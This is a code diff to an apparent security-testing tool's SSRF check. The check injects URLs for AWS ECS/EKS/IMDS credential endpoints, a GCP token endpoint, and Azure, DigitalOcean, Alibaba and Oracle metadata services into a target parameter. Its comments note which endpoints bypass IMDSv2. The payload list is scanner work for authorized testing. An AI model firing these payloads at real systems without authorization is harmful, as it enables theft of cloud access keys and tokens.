@@ -10,27 +10,45 @@ async def test_cloud_metadata_impl(
     parameter: str = "url",
     path: str = "/",
     injection_point: str = "query",
+    extra_headers: dict | None = None,
 ) -> dict:
-    """Test SSRF to cloud metadata services (AWS, GCP, Azure, DigitalOcean).
+    """Test SSRF to cloud metadata + container-credential services (AWS/GCP/Azure/DO/Alibaba/Oracle).
+
+    Covers the modern header-less AWS credential pivots (ECS/EKS Pod Identity)
+    that stay reachable when IMDSv1 is disabled — IMDSv2 needs a token PUT a
+    plain parameter SSRF cannot issue, so it is not attempted here.
+
+    GCP and Azure IMDS require a request header (`Metadata-Flavor: Google` /
+    `Metadata: true`) on the INNER metadata fetch. A parameter SSRF cannot set
+    that header itself; pass `extra_headers` only when the target's SSRF is
+    known to forward request headers to the fetched URL.
 
     Args:
         session: Session name
         parameter: Parameter to inject SSRF payload into
         path: Endpoint path
         injection_point: Where to inject: 'query' or 'body'
+        extra_headers: Optional headers added to the outer request (e.g.
+            {"Metadata-Flavor": "Google"}) for header-forwarding SSRF only.
     """
     metadata_endpoints = [
-        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
+        # Header-less AWS credential endpoints first — highest-value, reachable
+        # via a plain parameter SSRF even when IMDSv1 is turned off.
+        ("AWS ECS/Fargate creds", "http://169.254.170.2/v2/credentials/", ["AccessKeyId", "SecretAccessKey"]),
+        ("AWS EKS Pod Identity", "http://169.254.170.23/v1/credentials", ["AccessKeyId", "SecretAccessKey"]),
+        ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
+        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
         # Each indicator must be specific enough that it's extremely unlikely to
         # appear in a non-metadata response. Weak generic words like "hostname",
         # "network", "compute", "instance" are rejected — they match documentation
         # pages, API listings, and any page mentioning servers.
-        ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
         ("AWS Hex IP", "http://0xA9FEA9FE/latest/meta-data/", ["ami-id", "instance-id"]),
         ("AWS Decimal IP", "http://2852039166/latest/meta-data/", ["ami-id", "instance-id"]),
-        ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", ["project-id", "service-accounts/default"]),
-        ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "vmId"]),
+        ("GCP Metadata (hdr-gated)", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ["access_token", "expires_in"]),
+        ("Azure Metadata (hdr-gated)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "vmId"]),
         ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet_id"]),
+        ("Alibaba", "http://100.100.100.200/latest/meta-data/", ["instance-id", "region-id"]),
+        ("Oracle Cloud", "http://192.0.0.192/opc/v2/instance/", ["ociAdName", "canonicalRegionName"]),
     ]
 
     lines = [f"Cloud Metadata SSRF Test: {parameter} on {path}\n"]
@@ -42,6 +60,8 @@ async def test_cloud_metadata_impl(
         if injection_point == "body":
             req["method"] = "POST"
             req["data"] = f"{parameter}={url}"
+        if extra_headers:
+            req["headers"] = extra_headers
 
         resp = await client.post("/api/session/request", json=req)
         if "error" in resp:
